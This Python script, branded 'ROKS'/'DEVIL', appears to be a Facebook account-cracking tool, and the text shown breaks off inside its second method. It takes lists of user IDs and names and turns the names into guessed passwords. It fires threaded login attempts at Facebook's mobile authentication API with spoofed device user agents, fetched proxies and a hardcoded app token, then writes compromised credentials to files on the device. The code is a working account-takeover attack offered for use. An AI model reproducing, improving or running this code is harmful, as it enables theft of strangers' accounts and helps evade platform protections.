# Orignally Written By YOUCEF HAFAFNI
# Totally Written in python
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python DEVIL.py')
try:
    os.mkdir('/sdcard/DEVIL')
except:pass
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess 
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
    import rich
except ImportError:
    os.system('pip install rich')
    os.system('pip install http')
    os.system('pip install pycurl')
    time.sleep(1)
os.system('xdg-open https://t.me/Arr1098')
#print('\x1b[1;92m[✓] PLEASE WAIT CHECKING UPDATE DEVIL ...')
#os.system("espeak -a 300 \"PLEASE,WAIT,CHECKING,UPDATE,DEVIL\"")
#os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")

#────────────(TRACKING USERS IP)────────────#
#os.system('clear')
#ip = requests.get("https://api.ipify.org").text
#print('\033[1;92m[\033[1;92m✓\033[1;92m]\033[1;92m BOT SYSTEM IS TRACKING YOUR IP ADDRESS')
#time.sleep(2)
#print("\033[1;92m[\033[1;92m✓\033[1;92m]\033[1;92m THIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
#────────────(AUTO-CREATE-SETUP)────────────#

android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

#___[ PROXY SERVER ]____>>
os.system('rm -rf .prox.txt')  
try:
    prox= requests.get('https://raw.githubusercontent.com/mafiat2/M16/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550    5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c=f' en-us; {str(gt)}'
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
rug=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ruz.append(xd)
    
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
sys.stdout.write('\x1b]2; ROKS MX \x07')
logo=("""\033[1;32m
_______      ___   ___  ____   ______   
|_   __ \   .'   `.|_  ||_  _|.' ____ \  
  | |__) | /  .-.  \ | |_/ /  | (___ \_| 
  |  __ /  | |   | | |  __'.   _.____`.  
 _| |  \ \_\  `-'  /_| |  \ \_| \____) | 
|____| |___|`.___.'|____||____|\______.' 
                                         
\033[1;37m===========================================
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mAuthor  : \033[1;37msidou
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mGithub  : \033[1;37msidou
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mService : \033[1;32mFREE
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mVersion : \033[1;32m0.7
\033[1;37m===========================================""")
def linex():
	print('\033[1;37m===========================================')
def clear():
        os.system('clear')
        print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
    w=session.get("https://www.facebook.com/profile.php?id=",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s        '%(N,H,N,H,N))
    else:
        print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
    w=session.get("https://www.facebook.com/profile.php?id=",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s        '%(N,M,N,M,N))
    else:
        print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
            clear()
        #    linex()
            print(' \33[37;42m\t WELCOME ROKS TOOL \33[0;m');linex()
            print(' \033[1;32m[\033[1;37m1\033[1;32m] \033[1;37mCRACK FILE ')
            print(' \033[1;32m[\033[1;37m2\033[1;32m] \033[1;37mCREAT FILE FB ')
            print(' \033[1;32m[\033[1;37m3\033[1;32m] \033[1;37mUNBLOCk NETWORk IP')
            print(' \033[1;32m[\033[1;37m4\033[1;32m] \033[1;37mFOLLOW FB')
          
            print(' \033[1;32m[\033[1;37m5\033[1;32m] \033[1;37mTELEGRAM')
   
            print(' \033[1;32m[\033[1;37m0\033[1;32m] \033[1;37mEXIT ')
            linex()
            xd=input(' \033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mChose : ')
            if xd in ['1','01']:
                clear()
                print(' \033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mPut file example:  /sdcard/File.txt  etc..')
                linex()
                file = input('\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mPut file path\033[1;37m: ')
                linex()
                #file = input(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mPut file path\033[1;37m: ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(' File location not found ')
                    time.sleep(1)
                    menu()
                clear()
                print(' All method working ')
                linex()
                print(' \033[1;32m[\033[1;37m1\033[1;32m] \033[1;37mMethod \033[1;32m[NEW] ')
                print(' \033[1;32m[\033[1;37m2\033[1;32m] \033[1;37mMethod \033[1;32m[MIX] ')
                linex()
                mthd=input(' \033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mChoose: ')
                linex()
                plist = []
                try:
                    ps_limit = int(input(' \033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mHow many passwords do you want to add♡ ? '))
                except:
                    ps_limit =1
                clear()
                print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;32mexp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                    plist.append(input(f' \033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mPut password {i+1}: '))
                clear()
                print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mDo you went show cp account? (y/n): ')
                linex()
                cx=input(' \033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mChoose: ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mTotal id : \033[1;32m'+total_ids+f' ')
                    print("\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mDEVIL Crack Has Been Running ")
                    linex()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mthd in ['1','01']:
                            crack_submit.submit(api1,ids,names,passlist)
                        elif mthd in ['2','02']:
                            crack_submit.submit(api2,ids,names,passlist)
                        elif mthd in ['3','03']:
                            crack_submit.submit(api3,ids,names,passlist)
                        elif mthd in ['4','04']:
                            crack_submit.submit(api4,ids,names,passlist)
                        elif mthd in ['5','05']:
                            crack_submit.submit(api5,ids,names,passlist)
                        elif mthd in ['6','06']:
                            crack_submit.submit(api6,ids,names,passlist)
                        elif mthd in ['7','07']:
                            crack_submit.submit(api7,ids,names,passlist)
                        elif mthd in ['8','08']:
                            crack_submit.submit(api8,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
  
            elif xd in ['2','02']:
                        	create()
            elif xd in ['3','03']:
                createip()
                exit()
            elif xd in ['4','04']:
                 os.system('xdg-open https://www.facebook.com/Arr1098')
            elif xd in ['5','05']:
                 os.system('xdg-open https://t.me/+d0Yv6pDx2IhjNDhk')
            elif xd in ['0','00']:
                exit(' Thanks for use ♥ ')
            else:
                exit(' Option not found in menu...')
   
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [ROKS-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                __iam_genius = random.choice(android_models)
                phone_model = __iam_genius.split('|')[0]
                phone_company = __iam_genius.split('|')[1]
                dimensions = __iam_genius.split('|')[2]
                ffb=random.choice(fbks)
                dvlk = random.choice(usr)
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 10 Build/7475; Samsung Galaxy Note 20) [FBAN/224.2.2.0;FBBV/805803801;FBRV/6;com.facebook.mlite;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy Note 20;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.6,width=1404,height=1530};FB_FW/1;]','Dalvik/2.1.0 (Linux; U; Android 9 Build/6985; Xiaomi Redmi Note 10) [FBAN/370.3.2.0;FBBV/409185680;FBRV/7;com.facebook.ocra;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 10;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=860,height=633};FB_FW/2;]','Dalvik/2.1.0 (Linux; U; Android 11 Build/2132; Samsung Galaxy Note 20) [FBAN/971.8.7.0;FBBV/108222218;FBRV/2;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy Note 20;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.3,width=1171,height=509};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 12 Build/2086; Samsung Galaxy S21) [FBAN/402.1.8.0;FBBV/948636296;FBRV/5;com.facebook.ocra;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.1,width=623,height=1864};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 11 Build/6571; TECNO Model3) [FBAN/540.5.4.0;FBBV/495289227;FBRV/1;com.facebook.katana;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model3;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.2,width=444,height=1402};FB_FW/1;]','Dalvik/2.1.0 (Linux; U; Android 9 Build/7111; TECNO Model2) [FBAN/631.7.9.0;FBBV/717169410;FBRV/1;com.facebook.ocra;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model2;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=336,height=1462};FB_FW/2;]','Dalvik/2.1.0 (Linux; U; Android 11 Build/8879; TECNO Model3) [FBAN/871.6.8.0;FBBV/241182504;FBRV/8;com.facebook.mlite;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model3;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=569,height=580};FB_FW/2;]','Dalvik/2.1.0 (Linux; U; Android 9 Build/1116; Samsung Galaxy S21) [FBAN/413.9.6.0;FBBV/298877996;FBRV/0;com.facebook.ocra;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.6,width=1153,height=776};FB_FW/1;]','Dalvik/2.1.0 (Linux; U; Android 12 Build/9441; Samsung Galaxy S21) [FBAN/811.7.5.0;FBBV/349187007;FBRV/3;com.facebook.ocra;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S21;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.1,width=1020,height=722};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 9 Build/8914; Samsung Galaxy A52) [FBAN/804.5.9.0;FBBV/636892335;FBRV/2;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy A52;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.9,width=570,height=698};FB_FW/1;]','Dalvik/2.1.0 (Linux; U; Android 11 Build/8781; Samsung Galaxy A52) [FBAN/481.7.2.0;FBBV/198027084;FBRV/6;com.facebook.katana;FBLC/en_US;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy A52;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.4,width=1072,height=1780};FB_FW/2;]','Dalvik/2.1.0 (Linux; U; Android 9 Build/7044; Xiaomi POCO X3) [FBAN/487.7.9.0;FBBV/142827812;FBRV/8;com.facebook.katana;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/POCO X3;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.2,width=1019,height=1447};FB_FW/1;]','Dalvik/2.1.0 (Linux; U; Android 11 Build/8015; TECNO KE5) [FBAN/931.7.8.0;FBBV/619912845;FBRV/4;com.facebook.ocra;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/KE5;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.3,width=1414,height=1370};FB_FW/2;]"
                li = ['28','29','210']
                li2 = random.choice(li)
                j1 = ''.join(random.choice(digits) for _ in range(2))
                j2 = li2+j1
                device_family_id = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
                data = {'adid':adid,
                'format':'json',
                'device_id':device_family_id,
                'email':ids,
                'password':pas,
                'generate_analytics_claim':'1',
                'community_id':'','cpl':'true','try_num':'1',
                'family_device_id':device_family_id,
                'credentials_type':'device_based_login_password',
                'generate_session_cookies':'1',
                'error_detail_type':'button_with_disabled',
                'source':'device_based_login',
                'machine_id':machine_id,
                'login_location_accuracy_m':'1.0',
                'meta_inf_fbmeta':'',
                'advertiser_id':adid,
                'encrypted_msisdn':'',
                'currently_logged_in_userid':'0',
                'locale':'en_PK',
                'client_country_code':'PK',
                'method':'auth.login',
                'fb_api_req_friendly_name':'authenticate',
                'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'content-type':'application/x-www-form-urlencoded',
                'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-type':'unknown',
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent':ua_string,
                'x-fb-net-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                'x-fb-connection-quality':'EXCELLENT',
                'x-fb-friendly-name':'authenticate',
                'accept-encoding':'gzip, deflate',
                'x-fb-http-engine':    'Liger'}
                url = 'https://b-api.facebook.com/method/auth.login'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [ROKS-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/DEVIL/DEVIL-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [ROKS-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/DEVIL/DEVIL-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/DEVIL/DEVIL-CP.txt','a').write(ids+'|'+pas+'\n')
                        break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as e:
            pass
#m2
#b-graph method        
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ROKS-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
